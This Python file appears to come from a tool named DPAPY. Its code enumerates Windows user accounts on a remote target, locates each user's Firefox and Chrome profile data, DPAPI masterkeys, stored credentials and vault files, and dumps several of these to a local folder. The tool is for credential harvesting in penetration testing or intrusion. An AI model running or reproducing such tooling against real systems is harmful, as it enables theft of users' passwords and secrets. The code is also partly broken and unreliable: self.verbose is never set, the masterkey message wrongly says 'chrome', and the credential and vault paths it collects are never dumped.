from Core.DPAPYSearcher.RemoteSystemSearcher import *

class windowsUsers:
    def __init__(self):
        self.username = None
        self.rootLocalDirTarget = None
        self.rootLocalDirTargetUser = None

        self.masterkeyRemotePaths = []
        self.masterkeyLocalPaths = []
        self.masterkeyDecryptedLocalPaths = []

        self.firefoxRemotePaths = []
        self.firefoxLocalPaths = []

        self.chromeRemotePaths = []
        self.chromeLocalPaths =[]
        self.chromeLocalPathLocalState = None

        self.credentialsLocalPaths = []
        self.credentialsRemotePaths = []

        self.vaultRemotePaths = []
        self.vaultLocalPaths = []

        self.SID = []

class Dpapy:
    def __init__(self,sysSearch,options):
        self.sysSearch = sysSearch
        self.options = options

    def generateUserDumpList(self):
        allWindowsUsers = []
        defaultUsers = ['Default','Default User','Public','All Users','Administrator']
        allusers = self.sysSearch.getAllUsersOnSystem()
        if not self.options.defaultusers:
            for df in defaultUsers:
                if df in allusers:
                    allusers.remove(df)

        for user in allusers:
            print("[+] Retrieving all paths for user : "+ user + " ...")
            winuser = windowsUsers()
            winuser.username = user
            winuser.rootLocalDirTarget = pathlib.Path(os.getcwd() + "/" + self.sysSearch.output + "/" + self.sysSearch.target)
            winuser.rootLocalDirTargetUser = pathlib.Path(os.getcwd() + "/" + self.sysSearch.output + "/" + self.sysSearch.target + "/" + user)
            if(self.options.firefox ==True or self.options.all == True):
                winuser.firefoxRemotePaths = self.sysSearch.retrieveUserFirefoxPath(user)
            if(self.options.chrome == True or self.options.all == True):
                winuser.chromeRemotePaths = self.sysSearch.retrieveUserChromePath(user)
            if(self.options.masterkey == True or self.options.all == True):
                winuser.masterkeyRemotePaths = self.sysSearch.retrieveUserMasterkeyPath(user)
            if (self.options.credentials == True or self.options.all == True):
                winuser.credentialsRemotePaths = self.sysSearch.retrieveUserCredentialsPath(user)
            if(self.options.vault == True or self.options.all == True):
                winuser.vaultRemotePaths = self.sysSearch.retrieveUserVaultPath(user)
            allWindowsUsers.append(winuser)
        return allWindowsUsers

    def dumpSingleUserFiles(self,singleWindowsUser):
        if(singleWindowsUser.firefoxRemotePaths):
            singleWindowsUser = self.sysSearch.dumpFirefoxFiles(singleWindowsUser)
        else:
            if (self.verbose == True):
                print("No firefox dir for this user : " + singleWindowsUser.username)
        if(singleWindowsUser.chromeRemotePaths):
            singleWindowsUser = self.sysSearch.dumpChromeFiles(singleWindowsUser)
        else:
            if (self.verbose == True):
                print("No chrome dir for this user : " + singleWindowsUser.username)
        if (singleWindowsUser.masterkeyRemotePaths):
            singleWindowsUser = self.sysSearch.dumpMasterkeyFiles(singleWindowsUser)
        else:
            if (self.verbose == True):
                print("No chrome dir for this user : " + singleWindowsUser.username)
        return singleWindowsUser

    def dumpAllUserFiles(self,allWindowsUser):
        windowsUsersWLocalPaths = []
        for windowsusers in allWindowsUser:
            windowsUsersWLocalPaths.append(self.dumpSingleUserFiles(windowsusers))
        return windowsUsersWLocalPaths
